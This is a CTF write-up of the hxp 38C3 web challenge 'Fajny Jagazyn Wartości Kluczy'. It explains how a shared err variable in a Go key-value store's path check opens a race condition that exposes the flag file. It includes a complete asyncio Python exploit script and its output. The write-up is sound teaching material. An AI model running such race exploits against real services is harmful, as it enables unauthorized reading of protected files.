# Fajny Jagazyn Wartości Kluczy

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @viky, @ozetta
- 9 solves / 556 points
- Author: @0xbb
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

A fresh web scale Key Value Store just for you 🥰

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231194939.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231130613.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231130738.png)

When we go to the index page, it responds us with "We booted a fresh web scale Key Value Store just for you 🥰 (Please enjoy it for the next 180 seconds)" and set a new session cookie.

If we refresh the page with the cookie again, we are met with a 404 page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231130825.png)

Not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/Web/Fajny-Jagazyn-Warto%C5%9Bci-Kluczy/Fajny%20Jagazyn%20Warto%C5%9Bci%20Kluczy-ff7302985700444f.tar.xz):**
```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/Fajny-Jagazyn-Wartości-Kluczy)-[2024.12.31|13:11:13(HKT)]
└> file Fajny\ Jagazyn\ Wartości\ Kluczy-ff7302985700444f.tar.xz 
Fajny Jagazyn Wartości Kluczy-ff7302985700444f.tar.xz: XZ compressed data, checksum CRC64
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/Fajny-Jagazyn-Wartości-Kluczy)-[2024.12.31|13:11:15(HKT)]
└> tar xvf Fajny\ Jagazyn\ Wartości\ Kluczy-ff7302985700444f.tar.xz 
Fajny Jagazyn Wartości Kluczy/
Fajny Jagazyn Wartości Kluczy/Dockerfile
Fajny Jagazyn Wartości Kluczy/kv.go
Fajny Jagazyn Wartości Kluczy/compose.yml
Fajny Jagazyn Wartości Kluczy/flag.txt
Fajny Jagazyn Wartości Kluczy/frontend.go
```

After digging it a little bit, we can have the following findings:
1. This web application is written in Go
2. It has a frontend and a reverse proxy server

Let's first review the frontend side, `frontend.go`.

In the frontend, there's only 1 route:

```go
var backends sync.Map
[...]
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        session := ""
        if cookie, err := r.Cookie("session"); err == nil {
            session = cookie.Value
        }

        proxy, ok := backends.Load(session)
        if !ok {
            cookie := &http.Cookie{Name: "session", Value: NewKV(), Path: "/", Expires: time.Now().Add(180 * time.Second)}
            http.SetCookie(w, cookie)
            w.Write([]byte("We booted a fresh web scale Key Value Store just for you 🥰 (Please enjoy it for the next 180 seconds)"))
            return
        }
        proxy.(*httputil.ReverseProxy).ServeHTTP(w, r)
    })
    [...]
}
```

When we send a request to `/`, it'll get the reverse proxy object based on our `session` cookie's value and start serving the reverse proxy HTTP server. If the `session` cookie's value is not in the `backends` [concurrency safe map](https://victoriametrics.com/blog/go-sync-map/), it'll set a new `session` cookie with the return value of function `NewKV`:

```go
func NewKV() string {
    bytes := make([]byte, 32)
    if _, err := rand.Read(bytes); err != nil {
        return ""
    }
    session := hex.EncodeToString(bytes)

    go func() {
        cmd := exec.Command("./kv")
        cmd.Env = append(os.Environ(), "SESSION="+session)

        cmd.Run()
        backends.Delete(session)
    }()

    url, err := url.Parse("http://" + session)
    if err != nil {
        return ""
    }
    proxy := httputil.NewSingleHostReverseProxy(url)
    proxy.Transport = transport

    backends.Store(session, proxy)
    return session
}
```

This function basically generates a random 32 bytes for the `session` cookie value, execute OS command `./kv`, and create a new reverse proxy object, in which the URL will be `http://<session>`.

Hmm... This `frontend.go` seems not that interesting to us. What's up with that `./kv` command?

In `kv.go`, we can see how the reverse proxy server handles different requests:

```go
func main() {
    [...]
    session, ok := os.LookupEnv("SESSION")
    [...]
    dataDir := "/tmp/kv." + session
    err := os.Mkdir(dataDir, 0o777)
    [...]
    err = os.Chdir(dataDir)
    [...]
    http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
        [...]
    })

    http.HandleFunc("/set", func(w http.ResponseWriter, r *http.Request) {
        [...]
    })

    unixListener, err := net.Listen("unix", dataDir+"/kv.socket")
    [...]
    http.Serve(unixListener, nil)
}
```

In here, It first creates a new directory to `/tmp/kv.<session>` and change the current working directory to there. Then, it registers 2 routes, `/get` and `/set`. Finally, starts the HTTP server and accepts incoming HTTP connections on the UNIX domain socket.

Let's dive into those `/get` and `/set` route!

Route `/get`:

```go
http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil {
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }

    file, err := os.Open(name)
    if err != nil {
        http.Error(w, "Open :(", http.StatusInternalServerError)
        return
    }

    data, err := io.ReadAll(io.LimitReader(file, 1024))
    if err != nil {
        http.Error(w, "ReadAll :(", http.StatusInternalServerError)
        return
    }

    w.Write(data)
})
```

In route `/get`, it allows us to **read arbitrary files** using the `name` GET parameter. However, in the first if statement, it calls function `checkPath` to validate the path:

```go
func checkPath(path string) error {
    if strings.Contains(path, ".") {
        return fmt.Errorf("🛑 nielegalne (hacking)")
    }

    if strings.Contains(path, "flag") {
        return fmt.Errorf("🛑 nielegalne (just to be sure)")
    }

    return nil
}
```

**If the path contains `.` character or the word `flag`**, it'll not pass the validation. So, we have a limited arbitrary file read?

How about route `/set`?

```go
http.HandleFunc("/set", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil {
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }

    err := os.WriteFile(name, []byte(r.URL.Query().Get("value"))[:1024], 0o777)
    if err != nil {
        http.Error(w, "WriteFile :(", http.StatusInternalServerError)
        return
    }
})
```

In this route, we have arbitrary file write. We can specify the file's path via GET parameter `name`, and the file's content via GET parameter `value` (Maximum 1024 bytes long due to the string slicing). Again, same as `/get` route, it is a limited arbitrary file write.

Hmm... Interesting. Can we **use route `/get` to read the flag file**?

In `Dockerfile`, the flag file is in path `/home/ctf/flag.txt`:

```bash
[...]
COPY kv.go frontend.go flag.txt /home/ctf/
```

Oh, function `checkPath` will not return `nil` because of the character `.` and the word `flag`...

Maybe we can bypass that check?

```go
http.HandleFunc("/get", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    if err = checkPath(name); err != nil {
        http.Error(w, "checkPath :(", http.StatusInternalServerError)
        return
    }
    [...]
}
```

Wait, what's the differece between operator `:=` and `=`?

After some Googling, I found [this StackOverflow post's answer](https://stackoverflow.com/a/17891297).

In Go, operator `:=` is for variable **declaration** AND assignment, and `=` is variable assignment only.

Wait a minute, the first if statement's `err` is using `=`:

```go
if err = checkPath(name); err != nil {
```

Where's the declaration?

Turns out, the `err` variable is declared in the `main` function:

```go
func main() {
    [...]
    err := os.Mkdir(dataDir, 0o777)
    [...]
}
```

With that said, the `err` variable is in the `main` function's scope.

Ah ha! Can we win the **race condition** where the `name` is `/home/ctf/flag.txt` and also passed the if statement?

If we input `name` with `anything` until `err` to be assigned with `nil`. Then, we immediately input `name` with `/home/ctf/flag.txt`, will `err` still being `nil`?

## Exploitation

Armed with the above information, we can try to win the race condition with the following steps:
1. Send a GET request to `/get` with parameter `name=anything`, this will assign `err` with `nil`.
2. Send a GET request to `/get` with parameter `name=/home/ctf/flag.txt`, hopefully `err` will still be `nil`.

To automate the above steps, I have written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import aiohttp
import asyncio
import time

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.READ_FILE_ENDPOINT = f'{self.baseUrl}/get'
        self.VALID_CHECK_PARAMETER = '?name=anything'
        self.INVALID_CHECK_PARAMETER = '?name=/home/ctf/flag.txt'
        self.RACE_CONDITION_JOBS = 100

    async def setSessionCookie(self, session):
        await session.get(self.baseUrl)

    async def raceValidationCheck(self, session, parameter):
        url = f'{self.READ_FILE_ENDPOINT}{parameter}'
        async with session.get(url) as response:
            return await response.text()

    async def raceCondition(self, session):
        tasks = list()
        for _ in range(self.RACE_CONDITION_JOBS):
            tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER))
            tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER))
        return await asyncio.gather(*tasks)

    async def solve(self):
        async with aiohttp.ClientSession() as session:
            await self.setSessionCookie(session)
            await asyncio.sleep(1) # wait for the reverse proxy creation

            attempts = 1
            finishedRaceConditionJobs = 0
            while True:
                print(f'[*] Attempts #{attempts} - Finished race condition jobs: {finishedRaceConditionJobs}', end='\r')

                results = await self.raceCondition(session)
                attempts += 1
                finishedRaceConditionJobs += self.RACE_CONDITION_JOBS
                for result in results:
                    if 'hxp{' not in result:
                        continue

                    print(f'\n[+] We won the race window! Flag: {result.strip()}')
                    exit(0)

if __name__ == '__main__':
    baseUrl = 'http://localhost:8088' # for local testing
    # baseUrl = 'http://49.13.169.154:8088'
    solver = Solver(baseUrl)

    asyncio.run(solver.solve())
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/Fajny-Jagazyn-Wartości-Kluczy)-[2024.12.31|14:07:17(HKT)]
└> python3 solve.py
[*] Attempts #111 - Finished race condition jobs: 11000
[+] We won the race window! Flag: hxp{dummy}
```

> Note: I couldn't get it work on the remote instance. Maybe the infra is downscaled.

## Conclusion

What we've learned:

1. Race condition in Golang `=` operator